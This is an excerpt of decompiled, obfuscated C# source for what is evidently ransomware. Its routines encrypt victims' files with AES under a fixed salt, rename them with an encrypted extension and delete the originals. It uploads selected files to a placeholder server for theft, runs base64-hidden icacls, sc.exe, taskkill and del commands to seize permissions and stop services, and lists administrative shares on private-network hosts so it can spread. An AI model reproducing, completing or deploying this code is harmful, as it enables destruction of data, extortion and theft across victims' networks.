					if (!fileStream.CanWrite)
					{
						try
						{
							if (mGPgYiqNVpxAeD)
							{
								Console.WriteLine("Setting write access permission: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - File Size: " + new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length + " bytes");
								Console.WriteLine("----------------------------------------------------------------------------");
							}
						}
						catch
						{
						}
						kpitRsUfUPt(XKJIixIieoUFn("aWNhY2xzLmV4ZQ=="), "\"" + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + "\"" + XKJIixIieoUFn("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + XKJIixIieoUFn("OkYgL1QgL0MgL1E="));
					}
				}
				catch (Exception ex2)
				{
					if (HRuXHUgomikt)
					{
						try
						{
							File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length != 0L)
						{
							goto end_IL_02af;
						}
						goto end_IL_02af_2;
						end_IL_02af:;
					}
					catch (Exception ex4)
					{
						if (HRuXHUgomikt)
						{
							try
							{
								File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						WEeJdcZxxnxI++;
						goto end_IL_02af_2;
					}
					if (MsXKPMolFXtq == "YES" && new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length > Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
							{
								if (YxnJxsROHGpBEI)
								{
									CS_0024_003C_003E8__locals0.iaaUPMfAbF = sPVXhXLBBzIUR + CS_0024_003C_003E8__locals0.iaaUPMfAbF;
								}
								File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF);
							}
						}
						catch (Exception ex6)
						{
							if (HRuXHUgomikt)
							{
								try
								{
									File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							WEeJdcZxxnxI++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
						{
							CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ += CS_0024_003C_003E8__locals0.iaaUPMfAbF;
						}
						if (EpcuvjLUVs == "YES")
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in QEQDItjwRt)
								{
									if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pDcPGayaeXCih.iaaUPMfAbF) && PyEgbvgDxtxm == "YES")
									{
										if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ).Length)
										{
											try
											{
												CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ.ToLower().EndsWith(item2) && PyEgbvgDxtxm == "NO")
									{
										try
										{
											CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
						string s = SkKwndcWHaj.LJWdNIWcIsNR(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (rIDbJCbxXGOM == "NO")
						{
							byte[] array = null;
							byte[] byte_ = WffqVboAdbw.ZsrPQLMwHRSEDPmm(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, Convert.ToInt32(dlYfCorqiUsc) * 1024 * 1024);
							if (!WffqVboAdbw.vokiIpTrQqjl(sDetFbTBtkhqI: (!WKWPaQWPQqrRRB) ? (xSIJBVFhcrJvfz ? WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WffqVboAdbw.svujRJbmtni(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (xSIJBVFhcrJvfz ? HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HgseoqLGvnctpdH.uFQulJKjke(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), TgyqupHXQPS: CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, JOMSerecoaWty: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!xSIJBVFhcrJvfz)
						{
							if (!QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, dlYfCorqiUsc, CS_0024_003C_003E8__locals0.FDEMDnoDkQOCHM))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!QWgNsziBjsjPDSWc.GDBBRYhBRfPQ(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, dlYfCorqiUsc, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (YxnJxsROHGpBEI)
						{
							CS_0024_003C_003E8__locals0.iaaUPMfAbF = sPVXhXLBBzIUR + CS_0024_003C_003E8__locals0.iaaUPMfAbF;
						}
						string text2 = TyTofGcmTVMdzo.yJvKyXjrknPiH(32);
						string s2 = SkKwndcWHaj.LJWdNIWcIsNR(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
						{
							if (!KTdzEFOlwiRwULiD)
							{
								if (!xSIJBVFhcrJvfz)
								{
									fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, JIAoluZZnYH);
								}
								else
								{
									fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!xSIJBVFhcrJvfz)
									{
										caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, JIAoluZZnYH);
									}
									else
									{
										caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (HRuXHUgomikt)
									{
										try
										{
											File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex11.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									WEeJdcZxxnxI++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!KTdzEFOlwiRwULiD)
						{
							if (!xSIJBVFhcrJvfz)
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + ".part", JIAoluZZnYH);
							}
							else
							{
								fZGtMsFkyjz(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!xSIJBVFhcrJvfz)
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, JIAoluZZnYH);
								}
								else
								{
									caHjvPLJdshvqUkIWH(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (HRuXHUgomikt)
								{
									try
									{
										File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + " - Error while fully writing to file: " + ex14.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								WEeJdcZxxnxI++;
								return;
							}
						}
						if (xSIJBVFhcrJvfz)
						{
							if (CS_0024_003C_003E8__locals0.iaaUPMfAbF != ".*")
							{
								sOpOdEXhKGvUT(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ + CS_0024_003C_003E8__locals0.iaaUPMfAbF, bytes2);
							}
							else
							{
								sOpOdEXhKGvUT(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ, bytes2);
							}
						}
					}
					end_IL_02af_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0978;
			IL_0978:
			CS_0024_003C_003E8__locals0.izdizlukjze.Remove(CS_0024_003C_003E8__locals0.XrrXEzmNAnfLzJ);
		});
	}

	private static void VCWpaghcUw(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (EpcuvjLUVs == "YES")
					{
						foreach (string item in QEQDItjwRt)
						{
							if (string_0.ToLower().EndsWith(item) && PyEgbvgDxtxm == "YES")
							{
								if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
							{
								try
								{
									CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(".part"))
					{
						File.Move(string_1, string_1.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void caHjvPLJdshvqUkIWH(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (EpcuvjLUVs == "YES")
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in QEQDItjwRt)
				{
					if (string_0.ToLower().EndsWith(item) && PyEgbvgDxtxm == "YES")
					{
						if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
					{
						try
						{
							CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = HgseoqLGvnctpdH.uFQulJKjke(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		VnshRzSTFwJvI++;
	}

	private static void fZGtMsFkyjz(string string_0, string string_1, byte[] byte_0)
	{
		hGIsLeZFDAfC CS_0024_003C_003E8__locals0 = new hGIsLeZFDAfC();
		CS_0024_003C_003E8__locals0.cqtTXDlDLQ = string_0;
		CS_0024_003C_003E8__locals0.lwxiCwMAalltm = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string lwxiCwMAalltm = CS_0024_003C_003E8__locals0.lwxiCwMAalltm;
			FileStream fileStream = new FileStream(lwxiCwMAalltm, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (LlSPMTfPkGWMM == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.cqtTXDlDLQ, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.cqtTXDlDLQ, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.cqtTXDlDLQ, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.lwxiCwMAalltm.Length > 0)
				{
					if (EpcuvjLUVs == "YES")
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.cqtTXDlDLQ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in QEQDItjwRt)
						{
							if (CS_0024_003C_003E8__locals0.cqtTXDlDLQ.ToLower().EndsWith(item) && PyEgbvgDxtxm == "YES")
							{
								if (Convert.ToInt32(WTlibewEpYC) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.cqtTXDlDLQ);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.cqtTXDlDLQ.ToLower().EndsWith(item) && PyEgbvgDxtxm == "NO")
							{
								try
								{
									CmYAejDgYJsctGHm.cAQIzFscohI("URL", "USERNAME", "ACCESO", CS_0024_003C_003E8__locals0.cqtTXDlDLQ);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.cqtTXDlDLQ);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.lwxiCwMAalltm.EndsWith(".part"))
					{
						File.Move(CS_0024_003C_003E8__locals0.lwxiCwMAalltm, CS_0024_003C_003E8__locals0.lwxiCwMAalltm.Replace(".part", ""));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.lwxiCwMAalltm))
							{
								File.Delete(CS_0024_003C_003E8__locals0.lwxiCwMAalltm);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (HRuXHUgomikt)
			{
				try
				{
					File.AppendAllText(kCftkBXDnujA, "File: " + CS_0024_003C_003E8__locals0.cqtTXDlDLQ + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = qxxQfIPOBMpMzFB;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				kpitRsUfUPt(XKJIixIieoUFn("c2MuZXhl"), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		List<string> source2 = vqSvbuvOlqTPkNEZ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		if (LOgnTGWpyqwcGR == "YES")
		{
			string[] tnKKArGCBddMn = TnKKArGCBddMn;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
				};
			}
			Parallel.ForEach(tnKKArGCBddMn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		if (!gotnrzqTwtuXaGE().Contains("XP"))
		{
			gevYUdZEuEUkvJoG(NakyyfyCidlkEyZM);
		}
		else
		{
			List<string> source3 = fAlQHXxZrRxGqqm;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					kpitRsUfUPt(XKJIixIieoUFn(zzsZUpEDaqFx("lhXZu4WatRWYzNnd")), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		List<string> lszFxvCKWvtOQXb = LszFxvCKWvtOQXb;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				kpitRsUfUPt(XKJIixIieoUFn("ZGVsLmV4ZQ=="), string_0);
			};
		}
		Parallel.ForEach(lszFxvCKWvtOQXb, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		kpitRsUfUPt(XKJIixIieoUFn("c2MuZXhl"), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		kpitRsUfUPt(XKJIixIieoUFn("dGFza2tpbGwuZXhl"), "/IM " + string_0 + " /f");
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		kpitRsUfUPt(XKJIixIieoUFn(zzsZUpEDaqFx("lhXZu4WatRWYzNnd")), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		kpitRsUfUPt(XKJIixIieoUFn("ZGVsLmV4ZQ=="), string_0);
	}

	private static void _003CMapDrv_003Eb__18(string string_0)
	{
		vugnkECkUbG CS_0024_003C_003E8__locals0 = new vugnkECkUbG();
		CS_0024_003C_003E8__locals0.otfYEvvRNGn = string_0;
		if ((!CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("10.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("172.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("192.168.") && !CS_0024_003C_003E8__locals0.otfYEvvRNGn.StartsWith("")) || !IvbJmHRnKzXS.zKGiVDaeLxwG(CS_0024_003C_003E8__locals0.otfYEvvRNGn))
		{
			return;
		}
		try
		{
			Thread.Sleep(PAsRAwMADTR);
			nlODfRjnVhuyHV.Add("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\Users");
			try
			{
				if (mGPgYiqNVpxAeD)
				{
					Console.WriteLine("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\Users");
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(PAsRAwMADTR);
				nlODfRjnVhuyHV.Add("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\" + (char)int_0 + "$");
				try
				{
					if (mGPgYiqNVpxAeD)
					{
						Console.WriteLine("\\\\" + CS_0024_003C_003E8__locals0.otfYEvvRNGn + "\\" + (char)int_0 + "$");
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}
}
